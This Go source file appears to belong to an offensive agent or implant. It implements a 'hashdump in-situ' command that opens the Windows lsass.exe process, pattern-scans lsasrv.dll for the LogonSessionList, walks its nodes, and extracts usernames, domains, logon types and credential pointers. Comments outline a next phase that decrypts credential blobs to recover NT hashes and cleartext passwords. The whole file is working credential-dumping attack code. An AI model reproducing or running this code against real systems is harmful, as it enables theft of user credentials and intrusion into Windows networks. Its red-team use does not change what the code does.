//go:build windows
// +build windows

package commands

// Phase 2B + 2C-i orchestrator for hashdump in-situ:
//
//   1. Run Phase 1 LSA enumeration to get an authoritative LUID → username
//      map (cross-reference oracle).
//   2. Open lsass.exe with PROCESS_VM_READ + PROCESS_QUERY_LIMITED_INFORMATION
//      and locate lsasrv.dll in the loader list.
//   3. Read the lsasrv.dll image into the agent process and pattern-scan for
//      the LogonSessionList anchor (sigscan + RIP-relative resolution from
//      Phase 2A).
//   4. Walk the doubly-linked LogonSessionList in remote memory.
//   5. For each walked node, overlay the KIWI_MSV1_0_LIST_63 layout (Phase
//      2C-i) to extract LUID, UserName, Domain, AuthPackage, LogonType,
//      LogonServer, and the Credentials list pointer. The structured LUID
//      is cross-referenced against the Phase 1 LUID set as the primary
//      validation; a byte-scan fallback (Phase 2B oracle) flags nodes whose
//      structured LUID is zero so layout drift is visible rather than silent.
//   6. Emit a structured JSON report (one entry per walked node) plus a
//      summary header.
//
// Phase 2C-ii will dereference the Credentials pointer captured here, locate
// h3DesKey/hAesKey via lsasrv.dll exports, and BCryptDecrypt MSV1_0
// credential blobs to surface NT hashes (and WDigest cleartext where
// available).

import (
	"encoding/hex"
	"encoding/json"
	"fmt"
	"strings"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

// lsassRemoteReader implements the cross-platform lsassReader interface
// against a live PROCESS_VM_READ handle. Reads short-circuit through the
// existing kernel32!ReadProcessMemory wrapper (lsassReadBytes), which already
// rejects short reads and surfaces a descriptive error string.
type lsassRemoteReader struct {
	h windows.Handle
}

func (r lsassRemoteReader) Read(addr uintptr, size uint32) ([]byte, error) {
	return lsassReadBytes(r.h, addr, size)
}

// insituFullNodeReport is the JSON-shaped record for a single walked
// LogonSessionList node, with Phase 2C-i structured fields layered on top
// of the Phase 2B walk metadata.
type insituFullNodeReport struct {
	Address          string   `json:"address"`
	Flink            string   `json:"flink"`
	Blink            string   `json:"blink"`
	ParsedLUID       string   `json:"parsed_luid,omitempty"`
	ParsedUserName   string   `json:"parsed_username,omitempty"`
	ParsedDomain     string   `json:"parsed_domain,omitempty"`
	ParsedAuthPkg    string   `json:"parsed_auth_package,omitempty"`
	ParsedLogonType  string   `json:"parsed_logon_type,omitempty"`
	ParsedLogonSrv   string   `json:"parsed_logon_server,omitempty"`
	CredentialsPtr   string   `json:"credentials_ptr,omitempty"`
	Phase1Match      bool     `json:"phase1_luid_match"`
	Phase1Source     string   `json:"phase1_match_source,omitempty"` // "structured" | "byte-scan-fallback"
	MatchedUsers     []string `json:"matched_users,omitempty"`
	ParseErrors      []string `json:"parse_errors,omitempty"`
	RawPreviewHex    string   `json:"raw_preview_hex"`
}

// insituFullSummary captures the top-level metadata of a hashdump in-situ
// full run (Phase 2B walk + Phase 2C-i structured parse).
type insituFullSummary struct {
	Phase1SessionCount int                    `json:"phase1_session_count"`
	LSASSPID           uint32                 `json:"lsass_pid"`
	LsasrvBase         string                 `json:"lsasrv_base"`
	LsasrvSize         uint32                 `json:"lsasrv_size"`
	AnchorAddr         string                 `json:"logon_session_list_anchor"`
	StructLayout       string                 `json:"struct_layout"`
	NodesWalked        int                    `json:"nodes_walked"`
	NodesMatched       int                    `json:"nodes_matched_to_phase1"`
	NodesStructParsed  int                    `json:"nodes_with_structured_luid"`
	UnmatchedLUIDs     []string               `json:"phase1_luids_not_seen_in_walk,omitempty"`
	Nodes              []insituFullNodeReport `json:"nodes"`
}

// executeInsituFull runs the full Phase 2B credential-discovery flow and
// returns a structured CommandResult. The output starts with a human-readable
// header, then a JSON payload with the full node walk for downstream tools.
func executeInsituFull() structs.CommandResult {
	// Step 1: Phase 1 enumeration. If this fails the run is aborted because
	// without the LUID oracle there is nothing to validate the walk against.
	phase1, err := enumerateInsituSessions()
	if err != nil {
		return errorf("Phase 1 LSA enumeration failed: %v", err)
	}

	luidIndex := make(map[uint64][]insituSession, len(phase1))
	luidsOrdered := make([]uint64, 0, len(phase1))
	for _, s := range phase1 {
		luid, ok := insituLUIDValue(s)
		if !ok {
			continue
		}
		luidIndex[luid] = append(luidIndex[luid], s)
		luidsOrdered = append(luidsOrdered, luid)
	}

	// Step 2: Open LSASS.
	pid, err := lsassFindPID()
	if err != nil {
		return errorf("Phase 2B: locate lsass.exe: %v", err)
	}
	h, err := lsassOpenForRead(pid)
	if err != nil {
		return errorf("Phase 2B: open lsass.exe pid=%d: %v", pid, err)
	}
	defer windows.CloseHandle(h)

	// Step 3: Find lsasrv.dll.
	mod, err := lsassFindModuleInLsass(pid, "lsasrv.dll")
	if err != nil {
		return errorf("Phase 2B: %v", err)
	}

	// Step 4: Read its bytes and locate the LogonSessionList anchor.
	lsasrvBytes, err := lsassReadModuleBytes(h, mod)
	if err != nil {
		return errorf("Phase 2B: read lsasrv.dll image (base=0x%X size=%d): %v", mod.Base, mod.Size, err)
	}
	anchor, err := findLogonSessionListAnchor(lsasrvBytes, mod.Base)
	if err != nil {
		return errorf("Phase 2B: %v", err)
	}

	// Step 5: Walk LogonSessionList. Partial walks are still useful — emit
	// what was collected even if a tail node fails. Read 0x180 bytes/node so
	// the Phase 2C-i layout (LUID, UserName, Domain, Type, LogonType,
	// LogonServer, Credentials) is captured in one ReadProcessMemory call.
	reader := lsassRemoteReader{h: h}
	layout := LayoutWin10W8
	nodes, walkErr := walkLogonSessionList(reader, anchor, layout.NodeReadSize, 64)

	// Step 6: For each walked node, overlay the layout to extract structured
	// fields, then cross-reference the parsed LUID against Phase 1. Fall back
	// to the Phase 2B byte-scan when the structured parse returns LUID 0
	// (likely layout drift on a different Windows build).
	matchedLUIDs := make(map[uint64]bool, len(luidIndex))
	reports := make([]insituFullNodeReport, 0, len(nodes))
	matchedNodes := 0
	structParsed := 0
	for _, n := range nodes {
		preview := 32
		if len(n.Raw) < preview {
			preview = len(n.Raw)
		}
		report := insituFullNodeReport{
			Address:       fmt.Sprintf("0x%X", n.Address),
			Flink:         fmt.Sprintf("0x%X", n.Flink),
			Blink:         fmt.Sprintf("0x%X", n.Blink),
			RawPreviewHex: hex.EncodeToString(n.Raw[:preview]),
		}
		parsed := parseLogonSessionFields(reader, n.Raw, layout)
		if parsed.LUID != 0 {
			structParsed++
			report.ParsedLUID = fmt.Sprintf("0x%016X", parsed.LUID)
		}
		report.ParsedUserName = parsed.UserName
		report.ParsedDomain = parsed.Domain
		report.ParsedAuthPkg = parsed.AuthPackage
		report.ParsedLogonSrv = parsed.LogonServer
		if name := logonSessionTypeName(parsed.LogonType); name != "" {
			report.ParsedLogonType = name
		}
		if parsed.CredentialsPtr != 0 {
			report.CredentialsPtr = fmt.Sprintf("0x%X", parsed.CredentialsPtr)
		}
		report.ParseErrors = parsed.ParseErrors

		// Primary cross-reference: parsed LUID matches a Phase 1 LUID.
		if parsed.LUID != 0 {
			if _, ok := luidIndex[parsed.LUID]; ok {
				matchedLUIDs[parsed.LUID] = true
				report.Phase1Match = true
				report.Phase1Source = "structured"
				for _, sess := range luidIndex[parsed.LUID] {
					report.MatchedUsers = append(report.MatchedUsers,
						fmt.Sprintf("%s\\%s (%s)", sess.Domain, sess.Username, sess.LogonType))
				}
			}
		}
		// Fallback: Phase 2B byte-scan when structured parse missed.
		if !report.Phase1Match {
			for _, luid := range luidsOrdered {
				if !scanRawForLUID(n.Raw, luid) {
					continue
				}
				matchedLUIDs[luid] = true
				report.Phase1Match = true
				report.Phase1Source = "byte-scan-fallback"
				for _, sess := range luidIndex[luid] {
					report.MatchedUsers = append(report.MatchedUsers,
						fmt.Sprintf("%s\\%s (%s)", sess.Domain, sess.Username, sess.LogonType))
				}
				break
			}
		}
		if report.Phase1Match {
			matchedNodes++
		}
		reports = append(reports, report)
	}

	var unmatched []string
	for _, luid := range luidsOrdered {
		if !matchedLUIDs[luid] {
			unmatched = append(unmatched, fmt.Sprintf("0x%016X", luid))
		}
	}

	summary := insituFullSummary{
		Phase1SessionCount: len(phase1),
		LSASSPID:           pid,
		LsasrvBase:         fmt.Sprintf("0x%X", mod.Base),
		LsasrvSize:         mod.Size,
		AnchorAddr:         fmt.Sprintf("0x%X", anchor),
		StructLayout:       layout.Name,
		NodesWalked:        len(nodes),
		NodesMatched:       matchedNodes,
		NodesStructParsed:  structParsed,
		UnmatchedLUIDs:     unmatched,
		Nodes:              reports,
	}

	jsonBytes, err := json.MarshalIndent(summary, "", "  ")
	if err != nil {
		return errorf("Phase 2B: marshal summary: %v", err)
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[+] Phase 1 LSA enumeration: %d session(s)\n", len(phase1)))
	sb.WriteString(fmt.Sprintf("[+] LSASS pid=%d, lsasrv.dll @ 0x%X (size %d bytes)\n", pid, mod.Base, mod.Size))
	sb.WriteString(fmt.Sprintf("[+] LogonSessionList anchor: 0x%X\n", anchor))
	if walkErr != nil {
		sb.WriteString(fmt.Sprintf("[!] Walk terminated early: %v (collected %d node(s))\n", walkErr, len(nodes)))
	} else {
		sb.WriteString(fmt.Sprintf("[+] Walked %d node(s) cleanly\n", len(nodes)))
	}
	sb.WriteString(fmt.Sprintf("[+] Layout: %s — %d/%d node(s) yielded a non-zero structured LUID\n", layout.Name, structParsed, len(nodes)))
	sb.WriteString(fmt.Sprintf("[+] Cross-referenced %d/%d Phase 1 LUID(s) into walked nodes\n\n", len(matchedLUIDs), len(luidsOrdered)))
	sb.WriteString(string(jsonBytes))
	return successResult(sb.String())
}
